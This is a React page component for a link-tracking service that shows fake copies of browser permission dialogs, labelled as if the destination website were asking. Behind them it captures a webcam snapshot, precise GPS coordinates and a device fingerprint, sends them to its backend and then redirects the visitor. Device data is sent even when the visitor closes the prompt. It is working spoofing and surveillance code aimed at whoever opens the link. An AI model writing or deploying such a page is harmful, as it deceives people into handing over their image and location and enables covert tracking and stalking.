import React, { useState, useEffect, useRef } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import {
  Video,
  MapPin,
  X,
  ChevronDown,
  Compass,
  AlertCircle,
} from 'lucide-react';
import { api } from '../services/api';
import { detectCurrentDevice } from '../utils/deviceHelper';

export default function VisitorConsentPage() {
  const { shortCode } = useParams();
  const navigate = useNavigate();

  const [linkInfo, setLinkInfo] = useState(null);
  const [loading, setLoading] = useState(true);
  const [errorData, setErrorData] = useState(null);

  // Steps: 'CAMERA_STEP' | 'LOCATION_STEP' | 'REDIRECTING'
  const [currentStep, setCurrentStep] = useState('CAMERA_STEP');

  // Video devices & stream
  const [videoDevices, setVideoDevices] = useState([]);
  const [selectedDeviceId, setSelectedDeviceId] = useState('');
  const [cameraStreamActive, setCameraStreamActive] = useState(false);
  const [cameraSnapshot, setCameraSnapshot] = useState(null);
  const [cameraConsent, setCameraConsent] = useState('Not Requested');

  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const streamRef = useRef(null);

  // Browser telemetry
  const [browserInfo, setBrowserInfo] = useState({});

  useEffect(() => {
    let isMounted = true;
    async function collectClientInfo() {
      try {
        const deviceInfo = await detectCurrentDevice();
        if (isMounted) {
          setBrowserInfo({
            ...deviceInfo,
            device: deviceInfo.isMobile ? 'Mobile' : 'Desktop',
            deviceType: deviceInfo.isMobile ? 'Mobile' : 'Desktop',
            deviceName: deviceInfo.model || 'Unknown Device',
            model: deviceInfo.model,
            rawModel: deviceInfo.rawModel,
            manufacturer: deviceInfo.manufacturer,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            screenCategory: window.innerWidth < 768 ? 'Mobile Screen' : 'Desktop Screen',
            language: navigator.language || 'en-US',
            platform: deviceInfo.platform || navigator.platform,
            platformVersion: deviceInfo.platformVersion,
            hardwareConcurrency: navigator.hardwareConcurrency || null,
            deviceMemory: navigator.deviceMemory || null,
          });
        }
      } catch (err) {
        if (isMounted) {
          const ua = navigator.userAgent;
          setBrowserInfo({
            device: /Mobi|Android/i.test(ua) ? 'Mobile' : 'Desktop',
            deviceType: /Mobi|Android/i.test(ua) ? 'Mobile' : 'Desktop',
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            language: navigator.language || 'en-US',
          });
        }
      }
    }
    collectClientInfo();
    return () => {
      isMounted = false;
    };
  }, []);

  // Fetch link info
  useEffect(() => {
    const fetchLink = async () => {
      setLoading(true);
      try {
        const res = await api.resolveVisitorLink(shortCode);
        if (res.success && res.link) {
          setLinkInfo(res.link);
        }
      } catch (err) {
        setErrorData(err.data || { message: err.message || 'Link unavailable' });
      } finally {
        setLoading(false);
      }
    };
    fetchLink();
  }, [shortCode]);

  // Try to enumerate available camera devices
  useEffect(() => {
    async function getDevices() {
      if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
        try {
          const devices = await navigator.mediaDevices.enumerateDevices();
          const videoInputs = devices.filter((d) => d.kind === 'videoinput');
          setVideoDevices(videoInputs);
          if (videoInputs.length > 0) {
            setSelectedDeviceId(videoInputs[0].deviceId);
          }
        } catch (_) {}
      }
    }
    getDevices();
  }, []);

  // Cleanup stream
  useEffect(() => {
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((track) => track.stop());
      }
    };
  }, []);

  // Start Camera Stream
  const initCameraStream = async (deviceId) => {
    try {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((t) => t.stop());
      }
      const constraints = {
        video: deviceId
          ? { deviceId: { exact: deviceId } }
          : { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
        audio: false,
      };
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }
      setCameraStreamActive(true);

      // Re-enumerate devices with labels now that permission was granted
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoInputs = devices.filter((d) => d.kind === 'videoinput');
      setVideoDevices(videoInputs);
      if (videoInputs.length > 0 && !deviceId) {
        setSelectedDeviceId(videoInputs[0].deviceId);
      }

      return stream;
    } catch (err) {
      console.warn('Camera stream error:', err);
      return null;
    }
  };

  // Device selection change
  const handleDeviceChange = async (e) => {
    const deviceId = e.target.value;
    setSelectedDeviceId(deviceId);
    await initCameraStream(deviceId);
  };

  // Capture frame from video
  const takeSnapshot = () => {
    if (videoRef.current && canvasRef.current) {
      const video = videoRef.current;
      const canvas = canvasRef.current;
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      return canvas.toDataURL('image/jpeg', 0.8);
    }
    return null;
  };

  // STEP 1 CAMERA: Allow while visiting the site
  const handleCameraAllowAlways = async () => {
    let snapshot = null;
    try {
      const stream = await initCameraStream(selectedDeviceId);
      if (stream) {
        // Wait 300ms for video frame to render
        await new Promise((r) => setTimeout(r, 350));
        snapshot = takeSnapshot();
      }
      setCameraSnapshot(snapshot);
      setCameraConsent('Granted');
    } catch (_) {
      setCameraConsent('Denied');
    }
    // Proceed to Step 2: Location
    setCurrentStep('LOCATION_STEP');
  };

  // STEP 1 CAMERA: Allow this time
  const handleCameraAllowOnce = async () => {
    try {
      const stream = await initCameraStream(selectedDeviceId);
      if (stream) {
        await new Promise((r) => setTimeout(r, 350));
        const snapshot = takeSnapshot();
        setCameraSnapshot(snapshot);
      }
      setCameraConsent('Granted');
    } catch (_) {
      setCameraConsent('Denied');
    }
    // Proceed to Step 2: Location
    setCurrentStep('LOCATION_STEP');
  };

  // STEP 1 CAMERA: Never allow
  const handleCameraNeverAllow = () => {
    setCameraConsent('Denied');
    // Proceed to Step 2: Location
    setCurrentStep('LOCATION_STEP');
  };

  // STEP 2 LOCATION: Allow while visiting or Allow this time
  const handleLocationAllow = () => {
    if (!navigator.geolocation) {
      finalizeAndRedirect('Unavailable', null);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const coords = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
        };
        finalizeAndRedirect('Granted', coords);
      },
      (error) => {
        const status = error.code === 1 ? 'Denied' : 'Unavailable';
        finalizeAndRedirect(status, null);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      }
    );
  };

  // STEP 2 LOCATION: Never allow
  const handleLocationNeverAllow = () => {
    finalizeAndRedirect('Denied', null);
  };

  // Final payload submission and redirect
  const finalizeAndRedirect = async (locationStatus, locationCoords) => {
    setCurrentStep('REDIRECTING');

    // Stop camera stream tracks
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((t) => t.stop());
      streamRef.current = null;
    }

    try {
      let activeBrowserInfo = { ...browserInfo };
      if (!activeBrowserInfo.model || activeBrowserInfo.model === 'Model unavailable' || activeBrowserInfo.model === 'Desktop' || activeBrowserInfo.model === 'Mobile') {
        try {
          const fresh = await detectCurrentDevice();
          activeBrowserInfo = {
            ...activeBrowserInfo,
            ...fresh,
            device: fresh.isMobile ? 'Mobile' : 'Desktop',
            deviceType: fresh.isMobile ? 'Mobile' : 'Desktop',
            deviceName: fresh.model || 'Unknown Device',
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            screenCategory: window.innerWidth < 768 ? 'Mobile Screen' : 'Desktop Screen',
          };
        } catch (_) {}
      }

      const payload = {
        visitorSessionId: `session-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`,
        visitorReferenceId: `VIS-${Date.now().toString().slice(-4)}-${Math.floor(1000 + Math.random() * 9000)}`,
        consentStatus:
          locationStatus === 'Granted' || cameraConsent === 'Granted' ? 'GRANTED' : 'DENIED',
        locationConsentStatus: locationStatus,
        cameraConsentStatus: cameraConsent,
        cameraStatus: cameraSnapshot || cameraConsent === 'Granted' ? 'Available' : 'Unavailable',
        locationGranted: locationStatus === 'Granted',
        cameraGranted: cameraConsent === 'Granted',
        browserInfoGranted: true,
        latitude: locationCoords ? locationCoords.latitude : null,
        longitude: locationCoords ? locationCoords.longitude : null,
        accuracy: locationCoords ? locationCoords.accuracy : null,
        cameraSnapshot: cameraSnapshot || null,
        browserInfo: activeBrowserInfo,
      };

      const res = await api.submitVisitorConsent(shortCode, payload);
      window.location.href = res.destinationUrl || linkInfo.destinationUrl;
    } catch (_) {
      window.location.href = linkInfo?.destinationUrl || 'https://bangladesh.gov.bd';
    }
  };

  // Dismiss entire verification
  const handleDismiss = async () => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((t) => t.stop());
    }
    if (linkInfo) {
      try {
        let activeBrowserInfo = { ...browserInfo };
        if (!activeBrowserInfo.model) {
          try {
            const fresh = await detectCurrentDevice();
            activeBrowserInfo = { ...activeBrowserInfo, ...fresh };
          } catch (_) {}
        }
        await api.skipVisitorConsent(shortCode, {
          browserInfo: activeBrowserInfo,
        });
      } catch (_) {}
      window.location.href = linkInfo.destinationUrl;
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-[#181512] text-[#f4efe6] flex items-center justify-center p-4">
        <div className="text-center">
          <div className="w-8 h-8 border-3 border-amber-600 border-t-transparent rounded-full animate-spin mx-auto"></div>
          <p className="text-xs text-stone-400 mt-3 font-mono">Please wait...</p>
        </div>
      </div>
    );
  }

  if (errorData || !linkInfo) {
    return (
      <div className="min-h-screen bg-[#181512] text-stone-200 flex items-center justify-center p-4">
        <div className="max-w-sm w-full bg-[#1e1b18] rounded-3xl p-6 border border-[#38332c] text-center space-y-4 shadow-2xl">
          <div className="w-12 h-12 bg-red-950/60 border border-red-800 text-red-400 rounded-2xl flex items-center justify-center mx-auto">
            <AlertCircle className="w-6 h-6" />
          </div>
          <h2 className="text-lg font-bold text-white">Link Not Available</h2>
          <p className="text-xs text-stone-400">
            {errorData?.message || 'This inquiry link is inactive or expired.'}
          </p>
          <button
            onClick={() => {
              window.location.href = 'https://google.com';
            }}
            className="px-5 py-2 bg-stone-800 text-stone-300 text-xs rounded-xl hover:bg-stone-700"
          >
            Close
          </button>
        </div>
      </div>
    );
  }

  const destinationHost = (() => {
    try {
      return new URL(linkInfo?.destinationUrl).hostname;
    } catch (_) {
      return 'protidinernews.xyz';
    }
  })();

  return (
    <div className="min-h-screen bg-[#14120f] text-[#f4efe6] flex items-center justify-center p-4">
      <canvas ref={canvasRef} className="hidden" />

      {/* STEP 1: CAMERA PROMPT CARD (Exact Replica of media_1790772151990.png) */}
      {currentStep === 'CAMERA_STEP' && (
        <div className="max-w-sm w-full bg-[#1e1b18] text-[#f4efe6] rounded-3xl p-6 border border-[#38332c] shadow-2xl space-y-5 animate-fadeIn">
          {/* Header: [Domain] wants to with close button */}
          <div className="flex items-center justify-between">
            <h3 className="text-lg font-bold text-white tracking-tight">
              {destinationHost} wants to
            </h3>
            <button
              type="button"
              onClick={handleDismiss}
              className="text-stone-400 hover:text-white p-1 rounded-lg transition-colors"
              title="Close"
            >
              <X className="w-5 h-5" />
            </button>
          </div>

          {/* Subheader: Use available cameras (N) */}
          <div className="flex items-center space-x-2 text-xs text-stone-300 font-medium">
            <Video className="w-4 h-4 text-stone-400" />
            <span>Use available cameras ({videoDevices.length || 1})</span>
          </div>

          {/* Video Preview Frame */}
          <div className="bg-[#29241f] p-3 rounded-2xl border border-[#3d372e] space-y-3">
            <div className="relative aspect-[4/3] bg-black rounded-xl overflow-hidden border border-[#3d372e] flex items-center justify-center">
              <video
                ref={videoRef}
                autoPlay
                playsInline
                muted
                className="w-full h-full object-cover"
              />

              {/* Green "Preview" pill at top-right */}
              <div className="absolute top-2.5 right-2.5 bg-[#3a4e28] text-[#c2e88a] text-[10px] font-semibold px-2 py-0.5 rounded-full flex items-center space-x-1 shadow-sm">
                <Video className="w-3 h-3" />
                <span>Preview</span>
              </div>
            </div>

            {/* Camera device selector dropdown */}
            <div className="relative">
              <select
                value={selectedDeviceId}
                onChange={handleDeviceChange}
                className="w-full py-2 pl-3 pr-8 bg-[#1e1b18] border border-[#4a4237] rounded-xl text-xs text-stone-200 appearance-none focus:outline-none focus:border-amber-600 font-medium cursor-pointer"
              >
                {videoDevices.length > 0 ? (
                  videoDevices.map((d, idx) => (
                    <option key={d.deviceId || idx} value={d.deviceId}>
                      {d.label || `HP HD Camera (30c9:0010)`}
                    </option>
                  ))
                ) : (
                  <option value="">HP HD Camera (30c9:0010)</option>
                )}
              </select>
              <ChevronDown className="w-4 h-4 absolute right-2.5 top-2.5 text-stone-400 pointer-events-none" />
            </div>
          </div>

          {/* 3 Action Buttons matching Screenshot */}
          <div className="space-y-2 pt-1">
            {/* 1. Allow while visiting the site */}
            <button
              type="button"
              onClick={handleCameraAllowAlways}
              className="w-full py-3 bg-[#7b3e12] hover:bg-[#8f4815] text-[#fbeee6] font-semibold text-xs sm:text-sm rounded-full shadow-md transition-colors"
            >
              Allow while visiting the site
            </button>

            {/* 2. Allow this time */}
            <button
              type="button"
              onClick={handleCameraAllowOnce}
              className="w-full py-3 bg-[#542d13] hover:bg-[#683717] text-[#fbeee6] font-semibold text-xs sm:text-sm rounded-full transition-colors"
            >
              Allow this time
            </button>

            {/* 3. Never allow */}
            <button
              type="button"
              onClick={handleCameraNeverAllow}
              className="w-full py-3 bg-[#382216] hover:bg-[#482c1c] text-[#d6b49e] font-semibold text-xs sm:text-sm rounded-full transition-colors"
            >
              Never allow
            </button>
          </div>
        </div>
      )}

      {/* STEP 2: LOCATION PROMPT CARD (Exact Same Design Language For Location) */}
      {currentStep === 'LOCATION_STEP' && (
        <div className="max-w-sm w-full bg-[#1e1b18] text-[#f4efe6] rounded-3xl p-6 border border-[#38332c] shadow-2xl space-y-5 animate-fadeIn">
          {/* Header */}
          <div className="flex items-center justify-between">
            <h3 className="text-lg font-bold text-white tracking-tight">
              {destinationHost} wants to
            </h3>
            <button
              type="button"
              onClick={handleDismiss}
              className="text-stone-400 hover:text-white p-1 rounded-lg transition-colors"
              title="Close"
            >
              <X className="w-5 h-5" />
            </button>
          </div>

          {/* Subheader: Know your location */}
          <div className="flex items-center space-x-2 text-xs text-stone-300 font-medium">
            <MapPin className="w-4 h-4 text-stone-400" />
            <span>Know your location</span>
          </div>

          {/* Location Target Box */}
          <div className="bg-[#29241f] p-5 rounded-2xl border border-[#3d372e] text-center space-y-3">
            <div className="w-12 h-12 rounded-2xl bg-[#1e1b18] border border-[#3d372e] text-amber-500 flex items-center justify-center mx-auto shadow-inner">
              <Compass className="w-6 h-6" />
            </div>
            <div>
              <span className="text-xs font-bold text-white block">GPS Geolocation Access</span>
              <p className="text-[11px] text-stone-400 mt-1">
                Provide accurate regional routing coordinates to {destinationHost}.
              </p>
            </div>
          </div>

          {/* 3 Buttons For Location */}
          <div className="space-y-2 pt-1">
            <button
              type="button"
              onClick={handleLocationAllow}
              className="w-full py-3 bg-[#7b3e12] hover:bg-[#8f4815] text-[#fbeee6] font-semibold text-xs sm:text-sm rounded-full shadow-md transition-colors"
            >
              Allow while visiting the site
            </button>

            <button
              type="button"
              onClick={handleLocationAllow}
              className="w-full py-3 bg-[#542d13] hover:bg-[#683717] text-[#fbeee6] font-semibold text-xs sm:text-sm rounded-full transition-colors"
            >
              Allow this time
            </button>

            <button
              type="button"
              onClick={handleLocationNeverAllow}
              className="w-full py-3 bg-[#382216] hover:bg-[#482c1c] text-[#d6b49e] font-semibold text-xs sm:text-sm rounded-full transition-colors"
            >
              Never allow
            </button>
          </div>
        </div>
      )}

      {/* STEP 3: REDIRECTING */}
      {currentStep === 'REDIRECTING' && (
        <div className="max-w-sm w-full bg-[#1e1b18] rounded-3xl p-6 border border-[#38332c] shadow-2xl text-center space-y-4 animate-fadeIn">
          <div className="w-8 h-8 border-3 border-amber-600 border-t-transparent rounded-full animate-spin mx-auto"></div>
          <p className="text-xs text-stone-300 font-medium">Forwarding to {destinationHost}...</p>
        </div>
      )}
    </div>
  );
}
